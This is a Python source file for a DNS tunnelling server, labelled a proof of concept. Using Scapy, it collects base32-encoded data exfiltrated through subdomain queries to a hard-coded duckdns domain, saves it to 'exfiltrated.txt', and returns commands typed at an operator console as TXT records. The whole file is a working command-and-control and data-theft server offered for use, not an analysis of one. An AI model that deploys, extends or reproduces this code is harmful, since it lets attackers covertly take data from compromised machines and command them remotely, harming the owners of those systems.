#!/usr/bin/env python3
"""
DNS Tunnel Server - PoC
Receives exfiltrated data from DNS subdomain queries.
Delivers operator commands as TXT record responses.

Setup:
  - Run with root / Administrator privileges (requires UDP/53).
  - Open UDP port 53 inbound on the host firewall.
  - Point the client's DNS_SERVER setting to this machine's IP.
  - Windows: install Npcap (https://npcap.com) before running.

Received data is appended to OUTPUT_FILE with a timestamp.
Type a command at the console prompt to queue it for the client.
Type 'clear' to cancel any pending command.

Data query format (client → server):
  <b32chunk>.<seq>.<total>.<sessionid>.d.cwmkaeg.duckdns.org

Command query format (client → server):
  command.cwmkaeg.duckdns.org  (TXT query)
  Server response TXT: base32-encoded command, or literal "NONE"
"""

import base64
import datetime
import socket
import sys
import threading

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
from scapy.packet import NoPayload

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DOMAIN      = "cwmkaeg.duckdns.org"
OUTPUT_FILE = "exfiltrated.txt"

conf.verb = 0  # suppress Scapy noise


# ---------------------------------------------------------------------------
# Shared mutable state (protected by locks)
# ---------------------------------------------------------------------------
_state_lock   = threading.Lock()
_state        = {"command": "NONE"}          # current queued command

_session_lock = threading.Lock()
_sessions     = {}                            # sid -> {"chunks": {idx: bytes}, "total": int}


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def _b32dec(s: str) -> bytes:
    s = s.upper()
    padding = (8 - len(s) % 8) % 8
    return base64.b32decode(s + "=" * padding)


def _b32enc(s: str) -> bytes:
    return base64.b32encode(s.encode("utf-8"))


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def _notify(msg: str) -> None:
    """Print a highlighted notification without clobbering the input prompt."""
    print(f"\n{'=' * 60}")
    print(msg)
    print("=" * 60)
    print(">>> ", end="", flush=True)


def _save(session_id: str, raw: bytes) -> None:
    """Decode and persist a fully-reassembled session payload."""
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        text = raw.decode("utf-8")
    except Exception:
        text = f"[binary] {raw.hex()}"

    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"[{ts}] [{session_id}] {text}\n")

    _notify(
        f"  DATA RECEIVED\n"
        f"  Session : {session_id}\n"
        f"  Time    : {ts}\n"
        f"  Payload : {text}"
    )


# ---------------------------------------------------------------------------
# DNS packet helpers
# ---------------------------------------------------------------------------

def _make_txt_response(req, txt: bytes):
    """Build a DNS TXT response packet for an incoming query packet."""
    return (
        IP(dst=req[IP].src, src=req[IP].dst)
        / UDP(dport=req[UDP].sport, sport=53)
        / DNS(
            id=req[DNS].id,
            qr=1, aa=1, rd=0,
            qd=req[DNS].qd,
            an=DNSRR(
                rrname=req[DNS].qd.qname,
                type="TXT",
                ttl=60,
                rdata=txt,
            ),
        )
    )


def _make_a_response(req):
    """Build a minimal DNS A response (acknowledgment for data queries)."""
    return (
        IP(dst=req[IP].src, src=req[IP].dst)
        / UDP(dport=req[UDP].sport, sport=53)
        / DNS(
            id=req[DNS].id,
            qr=1, aa=1, rd=0,
            qd=req[DNS].qd,
            an=DNSRR(
                rrname=req[DNS].qd.qname,
                type="A",
                ttl=60,
                rdata="127.0.0.1",
            ),
        )
    )


# ---------------------------------------------------------------------------
# Data reassembly
# ---------------------------------------------------------------------------

def _handle_data_query(sub_labels: list[str], src_ip: str) -> bool:
    """
    Parse a data-exfiltration sub-label list and accumulate chunks.
    sub_labels is the portion of the FQDN before the base domain, e.g.:
      ['<b32chunk>', '<seq>', '<total>', '<sessionid>', 'd']
    Returns True if the format matched (even if decode failed).
    """
    if len(sub_labels) < 5 or sub_labels[-1] != "d":
        return False

    session_id = sub_labels[-2]
    try:
        total    = int(sub_labels[-3])
        idx      = int(sub_labels[-4])
        raw_b32  = sub_labels[-5]
    except (ValueError, IndexError):
        return False

    with _session_lock:
        if session_id not in _sessions:
            _sessions[session_id] = {"chunks": {}, "total": total}
            print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s) expected)")

        # Store the raw base32 string, not decoded bytes.
        # The full base32 stream is split across chunks at arbitrary offsets,
        # so each chunk is not independently decodable — join first, decode once.
        _sessions[session_id]["chunks"][idx] = raw_b32
        received = len(_sessions[session_id]["chunks"])

        if received == total:
            full_b32 = "".join(_sessions[session_id]["chunks"][i] for i in range(total))
            del _sessions[session_id]
            try:
                assembled = _b32dec(full_b32)
            except Exception as exc:
                print(f"\n[!] Decode error (session={session_id}): {exc}")
                return True
            threading.Thread(
                target=_save, args=(session_id, assembled), daemon=True
            ).start()
        else:
            print(f"[~] Session {session_id}: {received}/{total} chunks")

    return True


# ---------------------------------------------------------------------------
# Main packet handler
# ---------------------------------------------------------------------------

_DOMAIN_LABELS = DOMAIN.split(".")
_DOMAIN_LEN    = len(_DOMAIN_LABELS)


def _dns_handler(pkt) -> None:
    # Only process DNS queries
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    dns = pkt[DNS]
    if dns.qr != 0 or dns.qdcount == 0:
        return

    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".")

    # Ignore queries outside our domain
    if not qname.endswith(DOMAIN):
        return

    labels     = qname.split(".")
    sub_labels = labels[:-_DOMAIN_LEN]   # strip base domain labels
    src_ip     = pkt[IP].src

    print(f"\n[DNS] {src_ip} → {qname}")

    # --- Command query ---
    if sub_labels == ["command"]:
        with _state_lock:
            cmd = _state["command"]

        if cmd == "NONE":
            txt_payload = b"NONE"
        else:
            txt_payload = _b32enc(cmd)

        print(f"[CMD] Responding with: {txt_payload.decode()}")
        send(_make_txt_response(pkt, txt_payload), verbose=0)
        return

    # --- Data exfiltration query ---
    if _handle_data_query(sub_labels, src_ip):
        send(_make_a_response(pkt), verbose=0)
        return

    print(f"[?]  Unrecognised sub-label pattern: {sub_labels}")


# ---------------------------------------------------------------------------
# Operator console
# ---------------------------------------------------------------------------

def _console_loop() -> None:
    """Read operator commands from stdin and queue them for clients."""
    print("\n[*] Operator console ready.")
    print("    Type a command to queue it for the next client poll.")
    print("    Type 'clear' to remove any pending command.\n")

    while True:
        try:
            print(">>> ", end="", flush=True)
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            return

        if not line:
            continue

        if line.lower() == "clear":
            with _state_lock:
                _state["command"] = "NONE"
            print("[*] Command cleared — clients will receive NONE.")
        else:
            with _state_lock:
                _state["command"] = line
            encoded = _b32enc(line).decode()
            print(f"[*] Command queued : '{line}'")
            print(f"    Encoded (b32)   : {encoded}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("=" * 60)
    print("  DNS Tunnel Server - PoC")
    print(f"  Domain filter : *.{DOMAIN}")
    print(f"  Output file   : {OUTPUT_FILE}")
    print(f"  Listening     : UDP/53 (all interfaces)")
    print("=" * 60)

    threading.Thread(target=_console_loop, daemon=True).start()

    # Bind a dummy UDP socket to port 53 so the kernel sees a listener and
    # does not fire ICMP port-unreachable when Scapy sniffs packets that the
    # OS stack would otherwise reject.
    _sink = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    _sink.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        _sink.bind(("0.0.0.0", 53))
        print("[*] ICMP suppression active (sink socket bound to UDP/53)")
    except OSError as e:
        print(f"[!] Could not bind sink socket (ICMP suppression disabled): {e}")

    print("[*] Sniffing for DNS queries…  (Ctrl+C to stop)\n")
    try:
        sniff(filter="udp port 53", prn=_dns_handler, store=0)
    except PermissionError:
        print("[!] Permission denied — run as root/Administrator.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
